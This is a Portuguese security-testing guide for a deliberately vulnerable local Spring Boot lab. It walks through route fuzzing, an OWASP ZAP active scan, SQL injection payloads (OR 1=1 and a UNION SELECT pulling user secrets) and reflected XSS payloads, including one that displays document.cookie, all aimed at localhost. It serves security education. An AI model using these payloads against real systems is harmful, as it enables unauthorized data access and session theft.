# 🛡️ Guia de Testes de Segurança
**Passo a passo para executar e evidenciar vulnerabilidades**

## 1. Preparação do Ambiente
### Iniciar a aplicação
```
mvn spring-boot:run
```
A aplicação subirá em:
http://localhost:8081

### Acessar Console H2
http://localhost:8081/h2

Configurações:
```
JDBC URL: jdbc:h2:mem:security
User: sa
Password:
```

## 2. Descobrir rotas ocultas com Fuzz
Ao realizar a execução de um spider, ele realiza a análise do enpoint origem informado e dos demais presentes no html do domínio. Mas para encontrar rotas ocultas não informadas no url, um bom meio é a prática do Fuzz.

### Etapa 1 — Definir varáveis para wordlist
O processo de Fuzz realiza a combinação de múltiplas possibilidades de endpoint em variáveis pré-definidas.

Para auxiliar nessas combinações, é possível fazer uso de uma wordlist. O fuzz realiza a combinação e realiza requisições para encontrar rotas válidas.

![Aplicação de wordlist](https://github.com/FatecNeoHorizon/security-test/blob/main/content/images/fuzz_param.png)

As rotas com retorno 200 tiveram sucesso na requisição. As rotas com retorno 400 são existentes, mas não puderam ser processadas pelo servidor. 

![Retorno de fuzz](https://github.com/FatecNeoHorizon/security-test/blob/main/content/images/fuzz_result.png)

## 3. Identificar inconsistências de segurança com Active Scan
Após identificar as rotas disponíveis do contexto informado, o Active Scan é responsável por realizar interações e através identificar fragilidades na segurança

![Alertas Active Scan](https://github.com/FatecNeoHorizon/security-test/blob/main/content/images/scan_return.png)

## 4. SQL Injection
### OR 1=1
URL:
```
http://localhost:8081/insecure/users/find?name=' OR 1=1 --
```
![SQL Injection 'OR 1=1'](https://github.com/FatecNeoHorizon/security-test/blob/main/content/images/injection_1or1.png)

### UNION SELECT
```
http://localhost:8081/insecure/users/find?name=' UNION SELECT id, name, secret, email FROM users --
```
![SQL Injection UNION](https://github.com/FatecNeoHorizon/security-test/blob/main/content/images/injection_union.png)

## 5. XSS - Cross-Site Scripting
### Reflected XSS
![XSS esperado](https://github.com/FatecNeoHorizon/security-test/blob/main/content/images/xss_ideal.png)
```
http://localhost:8081/insecure/xss?input=<script>alert(1)</script>
```
![XSS alert](https://github.com/FatecNeoHorizon/security-test/blob/main/content/images/xss_alert.png)

### Cookie Theft
```
http://localhost:8081/insecure/xss?input=<img src=x onerror="alert(document.cookie)">
```

## 13. OWASP ZAP
Active Scan:
```
http://localhost:8081/insecure/
```
